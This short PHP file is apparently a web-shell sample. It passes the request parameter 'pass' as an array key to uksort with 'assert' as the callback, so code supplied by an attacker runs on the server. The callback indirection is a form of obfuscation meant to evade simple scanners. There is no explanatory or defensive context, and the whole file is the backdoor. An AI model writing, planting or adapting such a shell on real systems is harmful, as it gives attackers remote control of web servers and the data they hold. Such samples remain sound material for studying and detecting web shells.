<?php
$arr = new ArrayObject(array('test' => 1, $_REQUEST['pass'] => 2));
$arr->uksort('assert');
?>